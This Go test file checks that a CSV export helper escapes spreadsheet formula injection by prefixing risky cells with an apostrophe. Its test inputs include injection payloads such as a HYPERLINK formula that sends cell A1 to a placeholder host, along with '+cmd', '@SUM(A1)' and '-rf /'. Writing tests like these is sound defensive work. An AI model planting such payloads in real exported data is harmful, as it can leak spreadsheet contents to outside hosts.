package utils

import (
	"encoding/csv"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/jfrog/jfrog-cli-core/v2/artifactory/commands/transferfiles/api"
	"github.com/jfrog/jfrog-cli-core/v2/utils/coreutils"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

type csvTestItem struct {
	Repo       string `json:"repo_key,omitempty"`
	Reason     string `json:"reason,omitempty"`
	StatusCode int    `json:"status_code,omitempty"`
}

func TestCreateCSVFileEscapesFormulas(t *testing.T) {
	t.Setenv(coreutils.HomeDir, t.TempDir())
	items := []csvTestItem{
		{Repo: "repo-a", Reason: "=1+1", StatusCode: 404},
		{Repo: "repo-b", Reason: `=HYPERLINK("http://x/?"&A1,"y")`, StatusCode: 500},
		{Repo: "repo-c", Reason: "+cmd", StatusCode: 1},
		{Repo: "repo-d", Reason: "-2+3", StatusCode: 1},
		{Repo: "repo-e", Reason: "@SUM(A1)", StatusCode: 1},
		{Repo: "repo-f", Reason: "\tx", StatusCode: 1},
		{Repo: "repo-g", Reason: "\rx", StatusCode: 1},
		{Repo: "repo-h", Reason: "\uFF1D1+1", StatusCode: 1},
		{Repo: "repo-i", Reason: "plain reason", StatusCode: 200},
		{Repo: "repo-j", Reason: "\nx", StatusCode: 1},
	}
	csvPath, err := CreateCSVFile("csv-escape-test", items, time.Now())
	require.NoError(t, err)

	f, err := os.Open(csvPath)
	require.NoError(t, err)
	defer func() { assert.NoError(t, f.Close()) }()
	records, err := csv.NewReader(f).ReadAll()
	require.NoError(t, err)
	require.Len(t, records, len(items)+1)

	expected := []string{"'=1+1", `'=HYPERLINK("http://x/?"&A1,"y")`, "'+cmd", "'-2+3", "'@SUM(A1)", "'\tx", "'\rx", "'\uFF1D1+1", "plain reason", "'\nx"}
	for i, exp := range expected {
		row := records[i+1]
		assert.Equal(t, items[i].Repo, row[0])
		assert.Equal(t, exp, row[1])
	}
	assert.Equal(t, []string{"Repo", "Reason", "StatusCode"}, records[0])
	// Positive control: numeric fields are untouched.
	assert.Equal(t, "404", records[1][2])
	assert.Equal(t, "200", records[9][2])
}

type csvNumericItem struct {
	Repo       string `json:"repo_key,omitempty"`
	Reason     string `json:"reason,omitempty"`
	StatusCode int    `json:"status_code,omitempty"`
	SizeBytes  int64  `json:"size_bytes,omitempty"`
}

func TestCreateCSVFileKeepsNegativeNumbers(t *testing.T) {
	t.Setenv(coreutils.HomeDir, t.TempDir())
	items := []csvNumericItem{{Repo: "repo-a", Reason: "=1+1", StatusCode: -1, SizeBytes: -5}}
	csvPath, err := CreateCSVFile("csv-negative-test", items, time.Now())
	require.NoError(t, err)

	f, err := os.Open(csvPath)
	require.NoError(t, err)
	defer func() { assert.NoError(t, f.Close()) }()
	records, err := csv.NewReader(f).ReadAll()
	require.NoError(t, err)
	require.Len(t, records, 2)
	// Numbers are not formulas and must stay numeric; the free-text reason is still neutralized.
	assert.Equal(t, "'=1+1", records[1][1])
	assert.Equal(t, "-1", records[1][2])
	assert.Equal(t, "-5", records[1][3])
}

func TestSanitizeCsvCell(t *testing.T) {
	testCases := []struct {
		name     string
		cell     string
		expected string
	}{
		{"empty", "", ""},
		{"plain", "plain reason", "plain reason"},
		{"formula", "=1+1", "'=1+1"},
		{"leading space", " =1+1", "' =1+1"},
		{"leading nbsp", " =1+1", "' =1+1"},
		{"leading nul", "\x00=1+1", "'\x00=1+1"},
		{"leading vertical tab", "\v@SUM(A1)", "'\v@SUM(A1)"},
		{"leading zero-width space", "\u200b+cmd", "'\u200b+cmd"},
		{"leading space then plain text", " hello", " hello"},
		{"fullwidth equals", "＝1+1", "'＝1+1"},
		{"negative number", "-1", "-1"},
		{"signed decimal", "+1.5", "+1.5"},
		{"negative text", "-1 text", "'-1 text"},
		{"hyphenated path", "-rf /", "'-rf /"},
		{"formula after semicolon", "x;=1+1", "'x;=1+1"},
		{"formula after tab", "x\t=1+1", "'x\t=1+1"},
		{"formula after semicolon and space", "x; =1+1", "'x; =1+1"},
		{"semicolon without formula", "a;b", "a;b"},
		{"negative infinity", "-Inf", "'-Inf"},
		{"signed infinity", "+Infinity", "'+Infinity"},
		{"hex float", "-0x1p-2", "'-0x1p-2"},
		{"underscore number", "-1_000", "'-1_000"},
		{"leading dot decimal", "-.5", "'-.5"},
		{"decimal with exponent", "-1.5e3", "-1.5e3"},
	}
	for _, testCase := range testCases {
		t.Run(testCase.name, func(t *testing.T) {
			assert.Equal(t, testCase.expected, sanitizeCsvCell(testCase.cell))
		})
	}
}

func TestCreateCSVFileSanitizesRealCallerType(t *testing.T) {
	t.Setenv(coreutils.HomeDir, t.TempDir())
	items := []api.FileUploadStatusResponse{{
		FileRepresentation: api.FileRepresentation{Repo: "repo-a", Path: "@scope/name/-/@scope", Name: "name.tgz"},
		SizeBytes:          -5,
		StatusCode:         -1,
		Reason:             "=1+1",
	}}
	csvPath, err := CreateCSVFile("csv-real-type-test", items, time.Now())
	require.NoError(t, err)

	f, err := os.Open(csvPath)
	require.NoError(t, err)
	defer func() { assert.NoError(t, f.Close()) }()
	records, err := csv.NewReader(f).ReadAll()
	require.NoError(t, err)
	require.Len(t, records, 2)
	row := strings.Join(records[1], "|")
	assert.Contains(t, row, "'=1+1")
	assert.Contains(t, row, "'@scope/name/-/@scope")
	assert.Contains(t, row, "|-1|")
	assert.Contains(t, row, "|-5|")
}

type csvHeaderItem struct {
	Formula string `csv:"=HEADER"`
	Plain   string `csv:"plain"`
}

func TestCreateCSVFileSanitizesHeaderRow(t *testing.T) {
	t.Setenv(coreutils.HomeDir, t.TempDir())
	csvPath, err := CreateCSVFile("csv-header-test", []csvHeaderItem{{Formula: "a", Plain: "b"}}, time.Now())
	require.NoError(t, err)

	f, err := os.Open(csvPath)
	require.NoError(t, err)
	defer func() { assert.NoError(t, f.Close()) }()
	records, err := csv.NewReader(f).ReadAll()
	require.NoError(t, err)
	require.Len(t, records, 2)
	assert.Equal(t, []string{"'=HEADER", "plain"}, records[0])
}
